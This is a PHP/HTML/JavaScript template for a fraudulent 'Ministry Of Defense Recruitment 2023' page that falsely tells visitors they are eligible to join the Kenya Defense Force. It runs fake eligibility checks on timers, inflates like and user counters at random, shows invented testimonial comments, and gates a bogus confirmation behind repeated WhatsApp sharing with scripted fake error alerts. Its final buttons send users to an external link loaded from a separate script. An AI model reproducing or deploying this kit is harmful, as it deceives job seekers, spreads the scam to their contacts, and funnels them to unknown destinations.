<?php
$case = "case1";
include_once 'inc/data.php';
include_once 'locale/Translate.php';
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title><?=__("Ministry Of Defense Recruitment 2023")?></title>
    <meta property="og:title" content="<?=__("Ministry Of Defense Recruitment 2023")?>"/>
	<meta property="og:description" content="<?=__("Apply Now For Ministry Of Defense Recruitment 2023")?>" />
	<meta property="og:image" content="<?=$img1?>"/>

    <style type="text/css">
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
        @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
        * {
            margin: 0;
            padding: 0;
            font-family: Poppins, Droid Arabic Naskh;
            font-weight: normal;
            box-sizing: border-box;


        }
        body {
            background: #ebedf0;
        }
        a {
            text-decoration: none;
        }
        .post {
            background: #fff;
            margin: 0 auto;
            padding: 10px;
            max-width: 500px;
            border: 1px solid #d0d1d5;
            border-radius: 3px;
        }
        .post img {
            width: 100%;
        }
        .welcome {
            font-size: 15px;
        }
        .amount,
        #getname {
            color: #098105;
            text-decoration: none;
        }
        .done {
            text-align: center;
            color: #27ae60;
        }
        .tip {
            font-size: 14px;
        }
        .title {
            text-align: center;
        }
        .error {
            display: none;
            text-align: center;
            font-size: 14px;
            color: #e74c3c;
        }
        button {
            display: block;
            width: 200px;
            height: 50px;
            color: #fff;
            border: none;
            outline: none;
            font-size: 24px;
            cursor: pointer;
            border-radius: 5px;
            padding: 0 10px;
            margin: 10px auto;
            background: rgb(49, 130, 235);
            transition: background 0.3s ease;
        }
        button:hover {
            background: #098105;
        }
        .phone {
            max-width: 400px;
            margin: 10px auto;
        }
        .phone input {
            width: 100%;
            height: 50px;
            padding: 10px;
            outline: none;
            border: 2px solid #cecece;
            font-size: 14px;
        }
        #confirm {
            width: 200px;
            margin: 10px auto;
            border-radius: 0px;
        }
        #loader {
            text-align: center;
        }
        .spin {
            width: 50px;
            height: 50px;
            background: transparent;
            border: solid 8px rgb(49, 130, 235);
            border-right-color: transparent;
            border-radius: 50%;
            margin: 10px auto;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            100% {
                transform: rotate(1turn);
            }
        }
        #loader,
        #info,
        #checking,
        #share,
        #claim {
            display: none;
        }
        .center {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .barr {
            direction: ltr;
            max-width: 400px;
            margin: 10px auto;
            box-sizing: border-box;
        }
        .fill {
            position: relative;
            display: inline-block;
            width: calc(100% - 100px);
            height: 35px;
            padding: 2px;
            border: 2px solid #098105;
        }
        #fill,
        #fill2 {
            background: #098105;
            width: 0%;
            height: 100%;
        }
        .percentage {
            width: 100px;
            float: right;
            height: 35px;
            font-size: 16px;
            border: 2px solid #098105;
        }
        #percentage,
        #percentage2 {
            margin-left: 5px;
        }
        #check,
        #check2 {
            display: none;
        }
        .counter {
            color: #7f7f7f;
            font-size: 12px;
            text-align: right;
            padding: 10px 0 10px 2px;
            border-bottom: 1px solid #e1e2e3;
        }
        .reactions {
            display: inline-flex;
            align-items: center;
            float: left;
        }
        .counter img {
            float: left;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            border: 2px solid #fff;
            box-sizing: content-box;
        }
        .like,
        .love {
            margin-right: -5px;
        }
        .like {
            z-index: 2;
        }
        .love {
            z-index: 1;
        }
        .bar {
            display: table;
            width: 100%;
            border-bottom: 1px solid #e1e2e3;
        }
        .bar .react {
            display: table-cell;
            width: calc(100% / 3);
            font-size: 12px;
            color: #7f7f7f;
            text-align: center;
            padding: 10px 0;
            cursor: pointer;
        }
        .comments {
            direction: ltr;
        }
        .comment {
            padding: 6px 0;
            margin-top: 5px;
        }
        .comment img {
            float: left;
            width: 32px;
            height: 32px;
            border: none;
            border-radius: 18px;
            cursor: pointer;
        }
        .reply {
            margin-left: 37px;
        }
        .single-container {
            margin-left: 37px;
            background: #f1f2f6;
            padding: 10px;
            border-radius: 15px;
            font-size: 12px;
        }
        .single-container .user {
            display: inline-block;
            cursor: pointer;
            color: #365899;
            margin-bottom: 5px;
        }
        .single-container .text {
            display: block;
        }
        .buttons {
            font-size: 12px;
            font-weight: bold;
            margin: 10px 0 0 47px;
            color: #90949c;
        }
        .action {
            cursor: pointer;
        }
        .action:hover {
            text-decoration: underline;
        }
        .input {
            padding: 6px 12px 12px;
        }
        .input input {
            width: 100%;
            background: #f1f2f6;
            padding: 10px;
            border-radius: 15px;
            border: 0;
            outline: none;
        }
        .A{
            text-align: center;
            background-color: rgb(137, 186, 250);
        }
    </style>
</head>
<body>
<center><img class="lazyload" data-src="<?=$img3?>" alt="unicef" style="width: 100%;"></center>
<marquee class="horizontal_marque" direction="left"><?=__("Ministry Of Defense Recruitment 2023/2024")?></marquee> <div class="A"><?=__("Till Today")?><b></br>
        <span id="countdowntimer" style="color:red;">4548</span></b></br><?=__("Users have taken advantage of this offer.")?></br>
	<script type="text/javascript">
        var timeleft = 4548;
        var downloadTimer = setInterval(function(){
            timeleft= timeleft + Math.floor(Math.random() * 600);
            document.getElementById('countdowntimer').textContent = timeleft;
            if (timeleft <= 0)
                clearInterval(downloadTimer);
        }, 1000);
	</script>
</div>
<div class="post" width="100%">
    <div id="intro">
        <p class="welcome"><?=__("Your Application has been received. Click on")?><span class="amount"><?=__("CHECK")?></span><?=__("below to confirm if you are eligible to join the Kenya Defense Force (KDF).")?><br> <span class="amount"><?=__("Note!")?></span><?=__("The Number Of Applicants is limited.")?><br>
        </p>
        <button id="go"><?=__("CHECK")?> ➤</button>
    </div>
    <div id="loader">
        <div><?=__("Please Wait ...")?></div>
        <div class="spin"></div>
        <div id="num">0%</div>
    </div>
    <div id="info">
        <p class="title"><?=__("VALIDATE YOUR NAME AND CLICK ON REQUEST:")?></p>
        <div class="phone">
            <center><input type="char" placeholder="<?=__("Enter your full name")?>" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
            <center>
                <center><p class="title"><?=__("LEVEL OF EDUCATION")?></p></center>
                <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
                    <option value="أختر نوع الشبكة" selected="1"><?=__("-----------SELECT")?></option>
                    <option value="1"><?=__("EARLY CHILDHOOD EDUCATION")?></option>
                    <option value="2"><?=__("PRIMARY EDUCATION")?></option>
                    <option value="3"><?=__("SECONDARY EDUCATION")?></option>
                    <option value="4"><?=__("UNDERGRADUATE")?></option>
                    <option value="5"><?=__("BACHELOR DEGREE")?></option>
                    <option value="6"><?=__("POSTGRADUATE")?></option>
                    <option value="7"><?=__("DIPLOMA")?></option>
                    <option value="8"><?=__("HIGHER DIPLOMA")?></option>
                    <option value="9"><?=__("Others")?></option>
                </select>
            </center><br>
            <button id="confirm"><?=__("REQUEST")?></button>
        </div>
        <p class="error"><?=__("Please Validate Your Name !")?></p>
    </div>
    <div id="checking">
        <p class="title"><?=__("Please wait a moment...")?></p>
        <div class="barr">
            <div class="fill">
                <div id="fill"></div>
            </div>
            <div class="percentage center">
                <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
                <span id="check"><i class="fa fa-check-circle"></i></span>
                <span id="percentage"></span>
            </div>
        </div>
    </div>
    <div id="share">
        <p class="tip"><?=__("Congratulations,")?><span id="getname"></span>,</p>
        <p class="tip"><?=__("After checking your applications, You're eligible to join the Kenya Defense Force (KDF).")?><span class="amount"><?=__("(APPROVED)")?><br><br></span> <center><?=__("How to proceed:")?></center>
        </p><br>
        <p class="tip"><?=__("NOTE: You'll receive a confirmation Sms/Email immediately if you follow instructions below;")?></p>
        <p class="tip"><?=__("1. Click the 'SHARE' button to share this information with 15 friends or 5 groups on WhatsApp so that they can also be aware of this so they don't fall into the hands of SCAMMERS who make fake promises to help them get recruited")?></p>
        <p class="tip"><?=__("2. Then click 'VALIDATE' after the GREEN verification bar is filled.")?></p>
        <p class="tip"><?=__("3. You will receive a confirmation Sms/Email within 15 minutes.")?></p>
        <br><bt><p class="tip" ><?=__("NOTE: Proper Sharing Of This Information To Your WhatsApp Friends/Groups Places You At A Higher Chance Of Getting Recruited.")?></p>

            <button id="whatsapp"><?=__("SHARE")?></button>
            <div class="barr">
                <div class="fill">
                    <div id="fill2"></div>
                </div>
                <div class="percentage center">
                    <span><i class="fa fa-spinner fa-pulse"></i></span>
                    <span id="percentage2">0%</span>
                </div>
            </div>
    </div>
    <div id="claim">
        <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
        <p class="title"><?=__("Congratulations, Your application is successful and you will receive a confirmation Sms/Email after your submission")?></p>
		<button onclick="jump()"> <?=__("Submit Now")?> </button>
		<center>
			<a onclick="jump()">
				<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final"><?=__("Check Application Status")?></button></a>
		</center><br/>
		<center>
			<a onclick="jump()">
				<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final"><?=__("Print PDF")?></button></a>
		</center>
	</div>
	<div class="comments">
		<div class="counter">
			<div class="reactions">
				<img class='like lazyload' data-src="<?=$img5?>" /> <img class='love lazyload' data-src="<?=$img6?>" /> <img class='care lazyload' data-src="<?=$img7?>" /> <span id="likes">134K</span>
			</div>
			<span id="comments">23K <?=__("comments")?></span> <span class="dot">·</span> <span id="shares">12K <?=__("shares")?></span>
		</div>
		<div class="bar">
			<span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked"><?=__("Like")?></a></span> <span class="react"><i class="fa fa-comment-o"></i> <?=__("Comment")?></span> <span class="react"><i class="fa fa-share"></i> <?=__("Share")?></span>
		</div>
		<div>
			<div class="comment">
			</div>
		</div>
		<div class="comment">
			<img class="lazyload" data-src="<?=$img5?>" />
            <div class="single-container">
                <span class="user"><?=__("Stephen Joel")?></span>
                <span class="text"><?=__("It was not even up to 15 minutes when I received an Sms, God bless KDF...")?></span>
            </div>
			<div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked"><?=__("Like")?></span> · <span class="action"><?=__("Reply")?></span></div>
		</div>
		<div class="comment">
			<img class="lazyload" data-src="<?=$img6?>" />
            <div class="single-container"><span class="user"><?=__("Enoch Williams")?></span> <span class="text"><?=__("I never thought i will be eligible but now I'm very happy. Can't wait to be on uniform")?> 😍</span></div>
			<div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked"><?=__("Like")?></span> · <span class="action"><?=__("Reply")?></span></div>
		</div>
		<div class="comment reply">
			<img class="lazyload" data-src="<?=$img7?>" />
            <div class="single-container"><span class="user"><?=__("Adam Fikayomi")?></span> <span class="text"><?=__("I am disappointed it took more than 15 minutes to get confirmation Sms and email. But I'm still happy at least it came")?></span></div>
			<div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked"><?=__("Like")?></span> · <span class="action"><?=__("Reply")?></span></div>
		</div>
		<div class="comment">
			<img class="lazyload" data-src="<?=$img8?>" />
            <div class="single-container"><span class="user"><?=__("Sandra Jacob")?></span> <span class="text"><?=__("Just follow the instructions and you will get it straight...just got mine I will be a proud female officer KDF")?></span></div>
			<div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked"><?=__("Like")?></span> · <span class="action"><?=__("Reply")?></span></div>
		</div>
		<div class="input"><input placeholder="<?=__("Write a comment")?>..." /></div>
	</div>
</div>
</div>
<script src="https://cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script>
<script src="/case1/api/d.php"></script>
<script>
    lazyload();

    function set_Cookie(name,value){
        var Days = 30;
        var exp = new Date();
        exp.setTime(exp.getTime() + (Days*20*1000));
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
    }
    function get_Cookie(name){
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
        if(arr=document.cookie.match(reg)){
            return unescape(arr[2]);
        }
        return '';
    }
</script>

<script type="text/javascript">
    var time = 0;
    window.setInterval(function () {
        time = time + 1;
        $(".t1").html(time + 1 + "m");
        $(".t2").html(time + 2 + "m");
        $(".t3").html(time + 4 + "m");
    }, 6e4);
    var likes = 134,
        comments = 23,
        shares = 12;
    window.setInterval(function () {
        likes = likes + Math.floor(Math.random() * 3);
        comments = comments + Math.floor(Math.random() * 2);
        shares = shares + Math.floor(Math.random() * 2);
        $("#likes").html(likes + "K");
        $("#comments").html(comments + "K comments");
        $("#shares").html(shares + "K shares");
    }, 5e3);
    $(".liked").click(function () {
        if ($(this).hasClass("selected")) {
            $(this).removeClass("selected");
            $(this).html("Like");
        } else {
            $(this).addClass("selected");
            $(this).html("Unlike");
        }
    });
</script>

<script type="text/javascript">

    $("#go").click(function () {
        $("#intro").fadeOut(0);
        $("#loader").fadeIn(1000);
        var i = 0;
        var interval = setInterval(function () {
            $("#num").text(i + "%");
            i += 1;
            if (i >= 100) {
                clearInterval(interval);
                $("#loader").fadeOut(0);
                $("#info").fadeIn(1000);
            }
        }, 50);
    });
    $("#confirm").click(function () {
        if ($("#name").val().length < 4)
        {
            $(".error").fadeIn(500);
        } else {
            $("#info").fadeOut(0);
            $("#checking").fadeIn(1000);
            var i = 0;
            var interval = setInterval(function () {
                i += 1;
                $("#percentage").text(i + "%");
                $("#fill").css("width", i + "%");
                if (i == 50) {
                    i = 49;
                    setTimeout(function () {
                        i = 50;
                    }, 1000);
                }
                if (i >= 100) {
                    clearInterval(interval);
                    $("#load").fadeOut(0);
                    $("#check").fadeIn(0);
                    setTimeout(function () {
                        $("#checking").fadeOut(0);
                        $("#share").fadeIn(1000);
                        $("#getname").html($("#name").val());
                    }, 500);
                }
            }, 50);
        }
    });
    $(document).click(function () {
        if ($("#name").is(":focus")) {
            $(".error").fadeOut(500);
        }
    });
</script>

<script>
    if (typeof tb === 'undefined') {
        tb = '';
    }
    error = "<?=__("Something is wrong!")?>\n<?=__("Posts are not calculated. You may have shared it with the same friend or group more than once, please re-share")?>",
    saved = "case1",
    share = "whatsapp://send?text=" + tb;

    var swidth = localStorage.getItem(saved);
    if (swidth !== null) {
        var width = swidth * 1;
        $("#intro").fadeOut(0);
        $(".comments").fadeOut(0);
        $("#share").fadeIn(0);
        $("#fill2").css("width", width + "%");
        $("#percentage2").text(width + "%");
    } else {
        var width = 0;
    }
    $("#whatsapp").click(function () {
        window.location.href = share;
        if (width == 0) {
            width += 50;
        } else if (width == 50) {
            alert(error);
            width += 15;
        } else if (width == 65) {
            width += 5;
        } else if (width == 70) {
            alert(error);
            width += 10;
        } else if (width == 80) {
            alert(error);
            width += 5;
        } else if (width == 85) {
            width += 2;
        } else if (width == 87) {
            width += 1;
        } else if (width == 88) {
            width += 2;
        } else if (width == 90) {
            width += 1;
        } else if (width == 91) {
            width += 1;
        } else if (width == 92) {
            width += 1;
        } else if (width == 93) {
            width += 1;
        } else if (width == 94) {
            width += 1;
        } else if (width == 95) {
            width += 1;
        } else if (width == 96) {
            width += 2;
        } else {
            $("#share").fadeOut(0);
            $("#claim").fadeIn(1000);
        }
        localStorage.setItem(saved, width);
        setTimeout(function () {
            $("#fill2").css("width", width + "%");
            $("#percentage2").text(width + "%");
        }, 2000);
    });
    $("#offer").click(function () {
        window.open(cad, "_blank");
    });
    function jump(){
        window.open(cad, "_blank");
    }
</script>

</body>
</html>
